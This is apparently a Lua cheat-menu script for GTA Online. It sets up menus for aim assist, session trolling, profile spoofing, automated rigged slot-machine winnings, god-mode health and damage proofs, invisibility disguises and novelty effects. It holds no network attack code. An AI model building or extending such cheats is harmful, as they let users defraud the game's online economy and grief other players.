---------------------------------------------------------------GT制作---------------------------------------------------------------------------
require "lib.GTlib.natives"
require "lib.GTlib.functions"  
require "lib.GTlib.gtlib"
require "lib.GTlib.playerlib"
focusref = {}
isfocused = false
selectedcolormenu = 0
colorselec = 1
allchatlabel = util.get_label_text("MP_CHAT_ALL")
teamchatlabel = util.get_label_text("MP_CHAT_TEAM")
log_dir = filesystem.stand_dir() .. '\\Log.txt'
full_stdout = ""
disp_stdout = ""
max_chars = 200
max_lines = 25
font_size = 0.40
JSkey = require 'lib.GTlib.JSkeyLib'
local scaleForm = require'lib.GTlib.ScaleformLib'
local SFasd = scaleForm('instructional_buttons')
local UFO = require "lib.GTlib.ufo"
local HomingMissiles = require "lib.GTlib.homing_missiles"
local GuidedMissile = require "lib.GTlib.guided_missile"
local configFile <const> = filesystem.scripts_dir() .. '\\GTScript\\'.. "config.ini"
local notification = b_notifications.new()

players_root = menu.list(menu.my_root(), "玩家选项", {}, "")
frendlist = menu.list(menu.my_root(), "好友选项", {"fl"}, "", function(); end)
selflist = menu.list(menu.my_root(), "自我选项", {}, "", function(); end)
weapon_options = menu.list(menu.my_root(), "武器选项", {}, "")
pvphelp = menu.list(menu.my_root(), "自瞄选项", {"pvphelp"}, "")
carfly = menu.list(menu.my_root(), "载具选项", {}, "", function(); end)
visuals = menu.list(menu.my_root(), "视觉选项", {}, "")
custselc = menu.list(menu.my_root(), "战局恶搞", {}, "", function(); end)
onlinemode = menu.list(menu.my_root(), '线上恢复', {'online'}, '')
 entity_options = menu.list(menu.my_root(), "居民选项", {}, "")
protex = menu.list(menu.my_root(), "防护选项", {}, "", function(); end)
funfeatures = menu.list(menu.my_root(), "娱乐选项", {}, "", function(); end)
teleport = menu.list(menu.my_root(), "传送选项", {}, "", function(); end)
teleport_place()
detection = menu.list(menu.my_root(), "玩家检测", {}, "", function(); end)
GPB = menu.list(menu.my_root(), "聊天选项", {}, "", function(); end)
sc = menu.list(menu.my_root(), "生成选项")
lobbyFeats = menu.list(menu.my_root(), "世界选项", {}, "")
Heist_Control = menu.list(menu.my_root(), "任务选项")
Musiness_Banager = menu.list(menu.my_root(), "自动产业")
Constructor_Lua = menu.list(menu.my_root(), "模型选项")
toolFeats = menu.list(menu.my_root(), "拓展选项", {}, "", function(); end)
other_options = menu.list(menu.my_root(), "其他选项")

pause=0

do1=16
re=17
mi=18
fa=19
sol=20
la=21
ti=22
do2=23

C1 = 16
D1 = 17
E1 = 18
F1 = 19
G1 = 20
A1 = 21
B1 = 22
C2 = 23

whole = 1
half = 2
quarter = 4
eighth = 8
sixteenth = 16

MOD_HORN = 14

horn_on = false

songs = {
    {
        -- From https://www.easymusicnotes.com/pdf-piano-1/twinkle-twinkle-little-star-classical-mozart-piano-level-1.pdf
        name = "一闪一闪亮晶晶",
        bpm = 90,
        notes = {
            pause,
            do1, do1, sol, sol, la, la, { pitch = sol, length = half }, pause,
            fa, fa, mi, mi, re, re, { pitch = do1, length = half }, pause,
            sol, sol, fa, fa, mi, mi, { pitch = re, length = half }, pause,
            sol, sol, fa, fa, mi, mi, { pitch = re, length = half }, pause,
            do1, do1, sol, sol, la, la, { pitch = sol, length = half }, pause,
            fa, fa, mi, mi, re, re, { pitch = do1, length = half }, pause,
        },
    },
    {
        -- From https://www.easymusicnotes.com/pdf-piano-1/au-claire-de-la-lune-children-traditional-piano-level-1.pdf
        name = "在月光下",
        bpm = 60,
        notes = {
            fa, fa, fa, sol, { pitch = la, length = half }, { pitch = sol, length = half },
            fa, la, sol, sol, { pitch = fa, length = whole },
            fa, fa, fa, sol,  { pitch = la, length = half }, { pitch = sol, length = half },
            fa, la, sol, sol, { pitch = fa, length = whole },
        },
    },
    {
        -- From https://www.easymusicnotes.com/pdf-piano-1/hot-cross-buns-children-traditional-piano-level-1.pdf
        name = "热热的十字面包",
        bpm = 60,
        notes = {
            { pitch = mi, length = half }, { pitch = re, length = half },
            { pitch = do1, length = half }, { pitch = pause, length = half },
            { pitch = mi, length = half }, { pitch = re, length = half },
            { pitch = do1, length = half }, { pitch = pause, length = half },
            do1, do1, do1, do1, re, re, re, re,
            { pitch = mi, length = half }, { pitch = re, length = half },
            { pitch = do1, length = half }, { pitch = pause, length = half },
        },
    },
}
local snowmens = {
    { -955.5352, -782.4186, 15.925326 },
    { -819.9067, 165.35524, 71.26295 },
    { -247.92003, -1561.2175, 32.22973 },
    { 901.3996, -288.05026, 65.643715 },
    { 1275.6772, -642.3789, 68.208786 },
    { 1993.1008, 3829.6396, 32.167336 },
    { -375.47916, 6230.158, 31.490055 },
    { -1414.4647, 5094.9272, 60.674263 },
    { -1946.0231, 594.93756, 119.79223 },
    { -1100.889, -1401.0138, 5.215467 },
    { -780.418, 877.2859, 203.18001 },
    { -455.12027, 1130.5625, 325.89175 },
    { 221.46722, -107.01075, 69.763985 },
    { 1560.3787, 6447.053, 23.9866 },
    { 3301.7886, 5149.8853, 18.34274 },
    { 1703.0568, 4671.928, 43.15301 },
    { 224.9161, 3107.3345, 42.18394 },
    { 2360.0037, 2522.7166, 46.66731 },
    { 1510.8555, 1725.0353, 109.89355 },
    { -48.96374, 1964.4028, 189.87181 },
    { -1516.2083, 2140.2168, 56.11924 },
    { -2826.2356, 1424.6211, 100.706116 },
    { -2957.531, 723.6389, 28.792404 },
    { 1341.4302, -1583.5093, 54.135414 },
    { 178.00232, -895.9712, 30.69326 }
}
config = {
    debug_mode = false,
    test_mode = false,
    delay_between_button_press = 500,
    delay_sitting_at_slot_machine = 5000,
    delay_between_spins = 3000,
    delay_after_entering_casino = 4000,
    default_spin_delay_time = 1000,
    max_daily_winnings = 45000000,
    millis_in_day = 86400000,
}
state = {}
menus = {}
commands = {
    rigslotmachines=menu.ref_by_path("Online>Quick Progress>Casino>Slot Machines Outcome")
}

slot_machine_positions = {
    {
        seated={x=1102.2573, y=232.43211, z=-50.0909},
        standing={x=1102.6787, y=232.73073, z=-49.84076, h=90},
    },
    {
        seated={x=1112.4808, y=234.83745, z=-50.0909},
        standing={x=1112.0146, y=235.13573, z=-49.84075, h=-90},
    },
    {
        seated={x=1110.1028, y=235.05864, z=-50.0909},
        standing={x=1110.5834, y=235.30466, z=-49.840767, h=90},
    },
    {
        seated={x=1111.9581, y=237.83565, z=-50.0909},
        standing={x=1112.1866, y=237.27339, z=-49.840763, h=0},
    },
    {
        seated={x=1113.66, y=238.81334, z=-50.0909},
        standing={x=1113.8134, y=238.09317, z=-49.840786, h=0}
    },
    {
        seated={x=1139.4238, y=250.89787, z=-51.2909},
        standing={x=1139.8647, y=250.2418, z=-51.035732, h=70}
    },
    {
        seated={x=1130.6184, y=251.2604, z=-51.2909},
        standing={x=1130.7328, y=251.68321, z=-51.035774, h=180}
    },
    {
        seated={x=1137.2375, y=253.092, z=-51.2909},
        standing={x=1137.3026, y=253.69514, z=-51.03577, h=180}
    },
    {
        seated={x=1103.4133, y=230.6071, z=-50.0909},
        standing={x=1102.95, y=230.27, z=-49.84, h=-90},
    },
    {
        seated={x=1118.7598, y=230.03072, z=-50.0909},
        standing={x=1119.2648, y=230.20291, z=-49.840748, h=100}
    },
}
CONFIG_DIR = filesystem.resources_dir() .. 'Dclog\\'
filesystem.mkdirs(CONFIG_DIR)
LEGACY_SPIN_LOG_FILE = CONFIG_DIR .. "spin_log.json"
SPIN_LOG_FILE = CONFIG_DIR .. "spin_log_".. players.get_rockstar_id(players.user()) .. ".json"
station_name = {
    ["布莱恩郡之声"] = "RADIO_11_TALK_02", 
    ["蓝色方舟"] = "RADIO_12_REGGAE",
    ["全球电台"] = "RADIO_13_JAZZ",
    ["飞莲电台"] = "RADIO_14_DANCE_02",
    ["真相 91.1"] = "RADIO_15_MOTOWN",
    ["实验室电台"] = "RADIO_20_THELAB",
    ["明镜公园之音"] = "RADIO_16_SILVERLAKE",
    ["103.2 空间"] = "RADIO_17_FUNK",
    ["好麦坞大道电台"] = "RADIO_18_90S_ROCK",
    ["金发洛圣都 97.8 电台"] = "RADIO_21_DLC_XM17",
    ["洛圣都地下电台"] = "RADIO_22_DLC_BATTLE_MIX1_RADIO",
    ["iFruit 电台"] = "RADIO_23_DLC_XM19_RADIO",
    ["自电台(如果该玩家没有设置自电台,将自动切换为 MOTOMAMI 洛圣都电台)"] = "RADIO_19_USER",
    ["洛圣都摇滚台"] = "RADIO_01_CLASS_ROCK",
    ["无止境流行乐电台"] = "RADIO_02_POP",
    ["洛圣都广播电台"] = "RADIO_03_HIPHOP_NEW",
    ["X 频道"] = "RADIO_04_PUNK",
    ["西海岸谈话电台"] = "RADIO_05_TALK_01",
    ["叛逆电台"] = "RADIO_06_COUNTRY", 
    ["灵魂之蜡电台"] = "RADIO_07_DANCE_01",
    ["东洛电台"] = "RADIO_08_MEXICAN",
    ["西海岸经典"] = "RADIO_09_HIPHOP_OLD",
    ["媒体播放器"] = "RADIO_36_AUDIOPLAYER",
    ["音乐柜"] = "RADIO_35_DLC_HEI4_MLR",
    ["库尔特 FM"] = "RADIO_34_DLC_HEI4_KULT",
    ["放松依旧洛圣都"] = "RADIO_27_DLC_PRHEI4",
}


local srgb = {cus = 100}
function requestweapon(...)
	local arg = {...}
	for _, model in ipairs(arg) do
		WEAPON.REQUEST_WEAPON_ASSET(model, 31, 26)
		while not WEAPON.HAS_WEAPON_ASSET_LOADED(model) do
			util.yield()
		end
	end
end
function RGBNeonKit(pedm)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    for i = 0, 3 do
        C_C_VEHICLE.SET_VEHICLE_NEON_ENABLED(vmod, i, true)
    end
end
local rgb = {cus = 100}
function zjbs()
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) ~= 0 then
        local vmod = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
        RGBNeonKit(players.user_ped())
        local red = (math.random(0, 255))
        local green = (math.random(0, 255))
        local blue = (math.random(0, 255))
        C_C_VEHICLE.SET_VEHICLE_NEON_COLOUR(vmod, red, green, blue)
        C_C_VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vmod, red, green, blue)
        C_C_VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vmod, red, green, blue)
        util.yield(rgb.cus)
       end
    end
    function qzd()
        local color = {
            {64, 1},
            {73, 2},
            {51, 3}, 
            {92, 4}, 
            {89, 5}, 
            {88, 6}, 
            {38, 7}, 
            {39 , 8}, 
            {137, 9}, 
            {135, 10}, 
            {145, 11},
            {142, 12} 
          }
         if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ~= 0 then
          local vmod = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
          RGBNeonKit(players.user_ped())
          local rcolor = math.random(1, 12)
          C_C_VEHICLE.TOGGLE_VEHICLE_MOD(vmod, 22, true)
          C_C_VEHICLE.SET_VEHICLE_NEON_INDEX_COLOUR(vmod, color[rcolor][1])
          C_C_VEHICLE.SET_VEHICLE_COLOURS(vmod, color[rcolor][1], color[rcolor][1])
          C_C_VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vmod, 0, color[rcolor][1])
          C_C_VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(vmod, color[rcolor][1])
          C_C_VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vmod, color[rcolor][2])
          util.yield(srgb.cus)
        end
    end
function notification(message, color)
    C_HUD._THEFEED_SET_NEXT_POST_BACKGROUND_COLOR(color)
    local picture = "CHAR_CHOP"
    GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(picture, 0)
    while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(picture) do
        util.yield()
    end
    util.BEGIN_TEXT_COMMAND_THEFEED_POST(message)
    
    HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(true, false)
    util.log(message)
end

if filesystem.exists(configFile) then
	for s, tbl in pairs(Ini.load(configFile)) do
		for k, v in pairs(tbl) do
			if Config[s] and Config[s][k] ~= nil then Config[s][k] = v end
		end
	end
	util.log("配置已加载")
end

util.keep_running()

local friends_in_session_list = menu.list_action(players_root, "战局好友", {"friendsinsession"}, "", friends_in_this_session, function(pid, name) menu.trigger_commands("p" .. players.get_name(pid)) end)
local modders_in_session_list = menu.list_action(players_root, "作弊玩家", {"moddersinsession"}, "", modders_in_this_session, function(pid, name) menu.trigger_commands("p" .. players.get_name(pid)) end)

util.create_tick_handler(function()
    for _, pid in players.list(true, true, true) do 
        local hdl = pid_to_handle(pid)
        if NETWORK.NETWORK_IS_FRIEND(hdl) or players.user() == pid then 
            if friends_in_this_session[pid] == nil then
                friends_in_this_session[pid] = players.get_name(pid) .. ' [' .. players.get_tags_string(pid) .. ']'
                menu.set_list_action_options(friends_in_session_list, friends_in_this_session)
            end
        end

        if players.is_marked_as_modder(pid) then 
            if modders_in_this_session[pid] == nil then
                modders_in_this_session[pid] = players.get_name(pid) .. ' [' .. players.get_tags_string(pid) .. ']'
                menu.set_list_action_options(modders_in_session_list, modders_in_this_session)
            end
        end
    end
end)

menu.action(players_root, "战局玩家", {}, "", function(click_type)
    menu.trigger_command(menu.ref_by_path('Players', 37))
end)

menu.divider(frendlist, "好友列表")
for i = 0 , get_friend_count() do
	local name = get_frined_name(i)
	if name == "*****" then goto yes end
	gen_fren_funcs(name)
	::yes::
end

player_info  = menu.list(players_root, '玩家信息栏', {''}, '')
InfOverlay = menu.action(player_info, "                 点击此处 > [玩家信息栏]", {""}, "", function()

    notification("正在加载玩家信息,请稍等")

util.yield(100)

dofile(filesystem.scripts_dir().."\\lib\\GTlib\\InfOverlay.lua")

    menu.delete(InfOverlay)

end)

require "lib.GTlib.spoofprofile"
  
local healthandprotex = menu.list(selflist, "生命选项", {}, "", function(); end)

local helperingame = menu.list(selflist, "游戏选项", {}, "", function(); end)

local funfeatures_self = menu.list(selflist, '自我娱乐', {}, '')

local aimkarma = menu.list(selflist, "瞄准惩罚", {}, "", function(); end)

menu.divider(healthandprotex, "恢复")

    local self_options_CUSTOM = menu.list(healthandprotex, "自定义血量护甲", {}, "")

    -- -- -- 自定义最大生命值 -- -- --
    menu.divider(self_options_CUSTOM, "Health")

    
    menu.toggle(self_options_CUSTOM, "自定义最大生命值", {}, "改变你的最大生命值。一些菜单会将你标记为作弊者。当它被禁用时，它会返回到默认的最大生命值。", function(toggle)
        custom_health(toggle)
    util.create_tick_handler(function()
        if PED.GET_PED_MAX_HEALTH(PLAYER.PLAYER_PED_ID()) ~= moddedHealth then
            PED.SET_PED_MAX_HEALTH(PLAYER.PLAYER_PED_ID(), moddedHealth)
            ENTITY.SET_ENTITY_HEALTH(PLAYER.PLAYER_PED_ID(), moddedHealth)
        end
        return UsingModHealth
    end)
end)

    moddedHealthSlider = menu.slider(self_options_CUSTOM, "最大生命值", { "rsetmaxhealth" }, "生命值将被修改为指定的数值", 50, 30000, defaultHealth, 50, function(value)
        setcustomhealth(value)
    end)
    
    
    -- -- -- 自定义最大护甲 -- -- --
menu.divider(self_options_CUSTOM, "Armour")

    menu.toggle(self_options_CUSTOM, "自定义最大护甲值", {}, "改变你的最大护甲值。一些菜单会将你标记为作弊者。当它被禁用时，它会返回到默认的最大护甲值。", function(toggle)
        custom_armor(toggle)
    util.create_tick_handler(function()
        if PLAYER.GET_PLAYER_MAX_ARMOUR(PLAYER.PLAYER_ID()) ~= moddedArmour then
            PLAYER.SET_PLAYER_MAX_ARMOUR(PLAYER.PLAYER_ID(), moddedArmour)
        end
        return UsingModArmour
    end)
end)
    
    moddedArmourSlider = menu.slider(self_options_CUSTOM, "最大护甲值", { "rsetmaxarmour" }, "护甲将被修改为指定的数值", 50, 30000, defaultArmour, 50, function(value)
        setcustomarmor(value)
    end)

    -----
    local self_options_CUSTOM_refill = menu.list(healthandprotex, "自定义生命恢复", {}, "")
    
    -- 正常状态
    menu.divider(self_options_CUSTOM_refill, "站立不动状态")

    menu.toggle(self_options_CUSTOM_refill, "功能开启", {}, "", function(toggle)
    standhealthon(toggle)
    end)
    
    menu.slider(self_options_CUSTOM_refill, "恢复程度", { "normal_refill_limit" }, "恢复到血量的多少，单位%\n默认：25%", 1, 100, 25, 10, function(value)
        standhpmode(value)
    end)
    
    menu.slider(self_options_CUSTOM_refill, "恢复速度", { "normal_refill_mult" }, "恢复速度\n默认：1.0", 1.0, 100.0, 1.0, 1.0, function(value)
        standhpmodetime(value)
    end)
    
    -- 掩体状态
    menu.divider(self_options_CUSTOM_refill, "掩体状态")
    
    
    menu.toggle(self_options_CUSTOM_refill, "功能开启", {}, "", function(toggle)
        hidehealthon(toggle)
    end)
    
    menu.slider(self_options_CUSTOM_refill, "恢复程度", { "cover_refill_limit" }, "恢复到血量的多少，单位%\n默认：25%", 1, 100, 25, 10, function(value)
        hidehpmode(value)
    end)
    
    menu.slider(self_options_CUSTOM_refill, "恢复速度", { "cover_refill_mult" }, "恢复速度\n默认：1.0", 1.0, 100.0, 1.0, 1.0, function(value)
        hidehpmodetime(value)
    end)
    
    ------

menu.action(healthandprotex, "补充血量", {"maxhealth"}, "", function()
	ENTITY.SET_ENTITY_HEALTH(players.user_ped(), PED.GET_PED_MAX_HEALTH(players.user_ped()), 0)
end)

menu.action(healthandprotex, "补充护甲", {"maxarmour"}, "", function()
    if util.is_session_started() then
		PED.SET_PED_ARMOUR(players.user_ped(), 50)
	else
		PED.SET_PED_ARMOUR(players.user_ped(), 100)
	end
end)

menu.toggle_loop(healthandprotex, '自动加血', {'JSfullRegen'}, '一直加血直到您的血被加满.', function()
    autocover()
end)

menu.toggle_loop(healthandprotex, "在掩体后时补充生命值", {"healincover"}, "", function()
    healthincover()
end, function ()
	PLAYER._SET_PLAYER_HEALTH_RECHARGE_LIMIT(players.user(), 0.25)
	PLAYER.SET_PLAYER_HEALTH_RECHARGE_MULTIPLIER(players.user(), 1.0)
end)

---
local toLockHealth = defaultHealth * 0.5
menu.toggle(healthandprotex, "当血量过低时锁定", {}, "当你的血量低于你设置的值后，锁定你的血量，以免死亡", function(toggle)
    islockHealth = toggle
    local localPed = PLAYER.PLAYER_PED_ID()
    local currentHealth
    util.create_tick_handler(function()
        if islockHealth then
            currentHealth = ENTITY.GET_ENTITY_HEALTH(localPed)
            if currentHealth < toLockHealth then
                ENTITY.SET_ENTITY_HEALTH(localPed, toLockHealth)
            end
        end
    end)
end)

lockHealthSlider = menu.slider(healthandprotex, "低于多少%血量", { "rlockhealth" }, "锁定前到达的最低血量，单位%", 10, 100, 50, 10, function(value)
    local maxHealth = ENTITY.GET_ENTITY_MAX_HEALTH(PLAYER.PLAYER_PED_ID())
    toLockHealth = maxHealth * value / 100
end)

------
menu.divider(healthandprotex, "通知")

menu.action(healthandprotex, "通知当前血量和最大血量", {}, "", function()
    notifyhealth()
end)

menu.action(healthandprotex, "通知当前护甲和最大护甲", {}, "", function()
    notifyarmor()
end)
    
    local proofsList = menu.list(selflist, "伤害避免", {}, "自定义无敌")
    local immortalityCmd = menu.ref_by_path("Self>Immortality")
    for _,data in pairs(proofs) do
        menu.toggle(proofsList, data.name, {data.name:lower().."proof"}, "让您对"..data.name:lower().."伤害避免", function(toggle)
            data.on = toggle
        end)
    end
    util.create_tick_handler(function()
        local local_player = players.user_ped()
        if not menu.get_value(immortalityCmd) then
            ENTITY.SET_ENTITY_PROOFS(local_player, proofs.bullet.on, proofs.fire.on, proofs.explosion.on, proofs.collision.on, proofs.melee.on, proofs.steam.on, false, proofs.drown.on)
        end
    end)


menu.slider_text(funfeatures_self, "获取鸡巴", {}, "请选择你的鸡巴", opt_pp, function(index, value, click_type)
    getbigjb(index, value, click_type)
end)


local _LR = menu.list(funfeatures_self, '火翅膀', {}, '')

        
        menu.toggle(_LR, '火翅膀', {'JSfireWings'}, '将火制成的翅膀附加在您的背上.', function (toggle)
            firewing(toggle)
        end)

        menu.slider(_LR, '火翅膀比例', {'JSfireWingsScale'}, '', 1, 100, 3, 1, function(value)
            firewingscale(value)
        end)

        menu.rainbow(menu.colour(_LR, '火翅膀颜色', {'JSfireWingsColour'}, '', fireWingsSettings.colour, false, function(colour)
            firewingcolour(colour)
        end))

local active_rideable_animal = 0

util.create_tick_handler(function()
    if active_rideable_animal ~= 0 then 
        -- dismounting 
        if PAD.IS_CONTROL_JUST_PRESSED(23, 23) then 
            ENTITY.DETACH_ENTITY(players.user_ped())
            entities.delete_by_handle(active_rideable_animal)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped())
            active_rideable_animal = 0
        end

        -- movement
        if not ENTITY.IS_ENTITY_IN_AIR(active_rideable_animal) then 
            if PAD.IS_CONTROL_PRESSED(32, 32) then 
                local side_move = PAD.GET_CONTROL_NORMAL(146, 146)
                local fwd = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(active_rideable_animal, side_move*10.0, 8.0, 0.0)
                TASK.TASK_LOOK_AT_COORD(active_rideable_animal, fwd.x, fwd.y, fwd.z, 0, 0, 2)
                TASK.TASK_GO_STRAIGHT_TO_COORD(active_rideable_animal, fwd.x, fwd.y, fwd.z, 20.0, -1, ENTITY.GET_ENTITY_HEADING(active_rideable_animal), 0.5)
            end
            if PAD.IS_CONTROL_JUST_PRESSED(76, 76) then 
                --TASK.CLEAR_PED_TASKS(active_rideable_animal)
                local w = {}
                w.x, w.y, w.z, _ = players.get_waypoint(players.user())
                if w.x == 0.0 and w.y == 0.0 then 
                    notify(translations.no_waypoint_set)
                else
                    TASK.TASK_FOLLOW_NAV_MESH_TO_COORD(active_rideable_animal, w.x, w.y, w.z, 1.0, -1, 100, 0, 0)
                end
            end
        end
    end
end)

local country_flags = {"apa_prop_flag_argentina", "apa_prop_flag_australia", "apa_prop_flag_austria", "apa_prop_flag_belgium", "apa_prop_flag_brazil", "apa_prop_flag_canada_yt", "apa_prop_flag_china", "apa_prop_flag_columbia", "apa_prop_flag_croatia", "apa_prop_flag_czechrep", "apa_prop_flag_denmark", "apa_prop_flag_england", "apa_prop_flag_eu_yt", "apa_prop_flag_finland", "apa_prop_flag_france", "apa_prop_flag_german_yt", "apa_prop_flag_hungary", "apa_prop_flag_ireland", "apa_prop_flag_israel", "apa_prop_flag_italy", "apa_prop_flag_jamaica", "apa_prop_flag_japan_yt", "apa_prop_flag_lstein", "apa_prop_flag_malta", "apa_prop_flag_mexico_yt", "apa_prop_flag_netherlands", "apa_prop_flag_newzealand", "apa_prop_flag_nigeria", "apa_prop_flag_norway", "apa_prop_flag_palestine", "apa_prop_flag_poland", "apa_prop_flag_portugal", "apa_prop_flag_puertorico", "apa_prop_flag_russia_yt", "apa_prop_flag_scotland_yt", "apa_prop_flag_script", "apa_prop_flag_slovakia", "apa_prop_flag_slovenia", "apa_prop_flag_southafrica", "apa_prop_flag_southkorea", "apa_prop_flag_spain", "apa_prop_flag_sweden", "apa_prop_flag_switzerland", "apa_prop_flag_turkey", "apa_prop_flag_uk_yt", "apa_prop_flag_us_yt", "apa_prop_flag_wales"}
local flags_fmt = {}
for _, flag in pairs(country_flags) do 
    table.insert(flags_fmt, first_to_upper(flag:gsub('apa_prop_flag_', ''):gsub('_yt', '')))
end

menu.list_action(funfeatures_self, "插旗", {"attachflagtocar"}, "", flags_fmt, function(index, val)
    if player_cur_car ~= 0 then 
        local hash = util.joaat(country_flags[index])
        request_model_load(hash)
        local flag = entities.create_object(hash, players.get_position(players.user()))
        local ht = get_model_size(ENTITY.GET_ENTITY_MODEL(player_cur_car)).z
        ENTITY.ATTACH_ENTITY_TO_ENTITY(flag, player_cur_car, 0, 0, 0, ht, 0, 0, 0, true, false, false, false, 0, true)
    end
end)

local rideable_animals_root = menu.list(funfeatures_self, "骑乘动物", {"rideableanimals"}, "请勿按空格键，有bug")

local ranimal_hashes = {util.joaat("a_c_deer"), util.joaat("a_c_boar"), util.joaat("a_c_cow")}
rideable_animals_root:list_action("生成", {"spawnranimal"}, "", {"鹿", "公猪", "牛"}, function(index)
    if active_rideable_animal ~= 0 then 
        notification("已经骑动物" , colors.blue)
        return 
    end
    local hash = ranimal_hashes[index]
    request_model_load(hash)
    local animal = entities.create_ped(8, hash, players.get_position(players.user()), ENTITY.GET_ENTITY_HEADING(players.user_ped()))
    ENTITY.SET_ENTITY_INVINCIBLE(animal, true)
    ENTITY.FREEZE_ENTITY_POSITION(animal, true)
    ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
    active_rideable_animal = animal
    local m_z_off = 0 
    local f_z_off = 0
    pluto_switch index do 
        case 1: 
            m_z_off = 0.3 
            f_z_off = 0.15
            break
        case 2:
            m_z_off = 0.4
            f_z_off = 0.3
            break
        case 3:
            m_z_off = 0.2 
            f_z_off = 0.1 
            break
    end
    if ENTITY.GET_ENTITY_MODEL(players.user_ped()) == util.joaat("mp_f_freemode_01") then 
        z_off = f_z_off
    else
        z_off = m_z_off
    end
    ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), animal, PED.GET_PED_BONE_INDEX(animal, 24816), -0.3, 0.0, z_off, 0.0, 0.0, 90.0, false, false, false, true, 2, true)
    request_anim_dict("rcmjosh2")
    TASK.TASK_PLAY_ANIM(players.user_ped(), "rcmjosh2", "josh_sitting_loop", 8.0, 1, -1, 2, 1.0, false, false, false)
    ENTITY.FREEZE_ENTITY_POSITION(animal, false)
    ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
end)

disguise_object = 0
disguise_objects = {
    [0] = "prop_bush_med_03",
    [1] = "prop_tree_lficus_06",
    [2] = "prop_palm_fan_03_b",
    [3] = "prop_streetlight_01",
    [4] = "prop_recyclebin_04_b"
}
disguise_names = {
    [0] = "灌木丛",
    [1] = "树",
    [2] = "棕榈树",
    [3] = "路灯",
    [4] = "垃圾桶"
}
appearance = menu.list(funfeatures_self, "隐藏自己")
disguise_state = state
menu.toggle(appearance, "隐藏开启", {"disguise"}, "", function(state)
    disguise_state = state

    if disguise_state then
        invisibility_select = menu.ref_by_path("Self>Appearance>Invisibility")
        object_hash = util.joaat(disguise_objects[disguise_object])
        player_pos = players.get_position(players.user())
        request_model(object_hash)
        object = entities.create_object(object_hash, player_pos)
        menu.set_value(invisibility_select, 2)
        ENTITY.SET_ENTITY_COLLISION(object, false, false)

        while disguise_state and players.exists(players.user()) do
            player_pos = players.get_position(players.user())
            player_rot = ENTITY.GET_ENTITY_ROTATION(players.user_ped(), 5)
            ENTITY.SET_ENTITY_COORDS(object, player_pos.x, player_pos.y, player_pos.z - 1, false, false, false, false)
            ENTITY.SET_ENTITY_ROTATION(object, 0, 0, player_rot.z, false, false, false, false)
            util.yield()
        end

        entities.delete_by_handle(object)
        menu.set_value(invisibility_select, 0)
    end
end)

disguise_object_slider = menu.slider_text(
    appearance, "隐藏选择", {"disguiseobject"}, "", disguise_names, function()end
)

util.create_tick_handler(function()
    if not players.exists(players.user()) then
        return false
    end

    disguise_object = menu.get_value(disguise_object_slider)
end)

    local firebreath = menu.list(funfeatures_self, '喷火', {}, '')


    menu.toggle(firebreath, '喷火', {'JSfireBreath'}, '', function(toggle)
        firebreathxxx(toggle)
    end)

    menu.slider(firebreath, '喷火比例', {'JSfireBreathScale'}, '', 1, 100, fireBreathSettings.scale * 10, 1, function(value)
        firebreathscale(value)
    end)

    menu.rainbow(menu.colour(firebreath, '喷火颜色', {'JSfireBreathColour'}, '', fireBreathSettings.colour, false, function(colour)
        firebreathcolour(colour)
    end))

menu.toggle(funfeatures_self, "金色翅膀", {"wring"}, "如果不起作用,那么就是bug", function(on_toggle)

	if on_toggle then	
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
	local wings = OBJECT.CREATE_OBJECT(util.joaat("vw_prop_art_wings_01a"), pos.x, pos.y, pos.z, true, true, true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(util.joaat("vw_prop_art_wings_01a"))
	ENTITY.ATTACH_ENTITY_TO_ENTITY(wings, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 0x5c01), -1.0, 0.0, 0.0, 0.0, 90.0, 0.0, false, true, false, true, 0, true)
else
	local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			end
end)

menu.toggle(funfeatures_self, "银色翅膀", {"wringa"}, "如果不起作用,那么就是bug", function(on_toggle)

	if on_toggle then	
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
	local wings = OBJECT.CREATE_OBJECT(util.joaat("vw_prop_art_wings_01b"), pos.x, pos.y, pos.z, true, true, true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(util.joaat("vw_prop_art_wings_01b"))
	ENTITY.ATTACH_ENTITY_TO_ENTITY(wings, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 0x5c01), -1.0, 0.0, 0.0, 0.0, 90.0, 0.0, false, true, false, true, 0, true)
else
	local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			end
end)

    local bones <const> = {
        0x49D9,	-- left hand
        0xDEAD,	-- right hand
        0x3779,	-- left foot
        0xCC4D	-- right foot
    }
    local colour = {r = 1.0, g = 0.0, b = 1.0, a = 1.0}
    local timer <const> = newTimer()
    local trailsOpt <const> = menu.list(selflist,"轨迹"), {}, ""
    local effect <const> = Effect.new("scr_rcpaparazzo1", "scr_mich4_firework_sparkle_spawn")
    local effects = {}
    
